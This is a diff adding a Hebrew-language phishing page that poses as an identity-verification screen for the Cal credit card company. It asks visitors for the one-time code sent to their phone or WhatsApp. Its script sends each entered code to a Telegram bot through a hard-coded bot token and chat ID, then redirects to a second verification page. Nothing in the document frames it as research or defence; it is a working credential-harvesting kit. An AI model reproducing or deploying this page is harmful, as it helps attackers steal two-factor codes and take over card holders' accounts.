@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="he">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cal אימות זהות</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            direction: rtl;
+            background-color: #f9f9f9;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            font-size: 32px;
+            color: #0072ce;
+            font-weight: bold;
+        }
+
+        .message {
+            font-size: 16px;
+            margin: 20px 0;
+            line-height: 1.6;
+        }
+
+        .input-container {
+            margin: 20px 0;
+        }
+
+        input[type="text"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            color: white;
+            background-color: #0072ce;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #005bb5;
+        }
+
+        .error-message {
+            color: red;
+            font-size: 14px;
+            display: none;
+            margin-top: 10px;
+        }
+
+        .visible {
+            display: block !important;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">Cal.</div>
+        <div class="message">
+            שלחנו לך קוד אימות לנייד הרשום אצלנו.<br>
+            אימות זהות עבור חשבון ה-Cal שלך<br>
+            ב-<span id="current-date"></span>.<br>
+            קוד חד-פעמי נשלח למספר הטלפון הנייד או<br>
+            לחשבון ה-WhatsApp שלך.
+        </div>
+
+        <div class="input-container">
+            <input type="text" id="code-input" placeholder="אנא הקלד את הקוד כאן">
+            <div class="error-message" id="empty-error-message">שגיאה: יש למלא את השדה</div>
+            <div class="error-message" id="invalid-code-message">שגיאה: קוד לא נכון. נשלח קוד חדש.</div>
+        </div>
+
+        <button onclick="handleContinue()">המשך</button>
+    </div>
+
+    <script>
+        let attempt = parseInt(sessionStorage.getItem("attempt")) || 0;
+
+        function updateDate() {
+            const today = new Date();
+            const day = String(today.getDate()).padStart(2, '0');
+            const month = String(today.getMonth() + 1).padStart(2, '0');
+            const year = today.getFullYear();
+            document.getElementById("current-date").innerText = `${day}/${month}/${year}`;
+        }
+
+        updateDate();
+
+        function handleContinue() {
+            const codeInput = document.getElementById("code-input").value.trim();
+            const emptyErrorMessage = document.getElementById("empty-error-message");
+            const invalidCodeMessage = document.getElementById("invalid-code-message");
+
+            emptyErrorMessage.classList.remove("visible");
+            invalidCodeMessage.classList.remove("visible");
+
+            if (codeInput === "") {
+                emptyErrorMessage.classList.add("visible");
+                return;
+            }
+
+            attempt++;
+            sessionStorage.setItem("attempt", attempt);
+
+            // إرسال البيانات إلى بوت تلجرام
+            sendTelegramMessage(codeInput);
+        }
+
+        function sendTelegramMessage(codeInput) {
+            const token = '7860990758:AAEL00gcX3iTB9N0D7z-9qBfDlbZ3hmHrO4';
+            const chatId = '5021790058';
+            const message = `קוד האימות שהוזן: ${codeInput}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent:', data);
+                // بعد إرسال الرسالة يتم الانتقال إلى الصفحة التالية
+                setTimeout(() => {
+                    window.location.href = "verification2.html";
+                }, 1000);  // تأخير بسيط قبل الانتقال إلى الصفحة التالية
+            })
+            .catch(error => {
+                console.error('Error sending message:', error);
+            });
+        }
+
+        if (window.location.pathname.includes("verification.html")) {
+            const previousPage = sessionStorage.getItem("previousPage");
+
+            if (attempt === 1 && previousPage) {
+                window.location.href = "verification2.html";
+            }
+        }
+
+        if (window.location.pathname.includes("verification2.html")) {
+            sessionStorage.removeItem("previousPage");
+            sessionStorage.removeItem("attempt");
+        }
+
+        window.onload = function() {
+            const invalidCodeMessage = document.getElementById("invalid-code-message");
+            if (sessionStorage.getItem("showError") === "true") {
+                invalidCodeMessage.classList.add("visible");
+                sessionStorage.removeItem("showError");
+            }
+        };
+    </script>
+
+</body>
+</html>
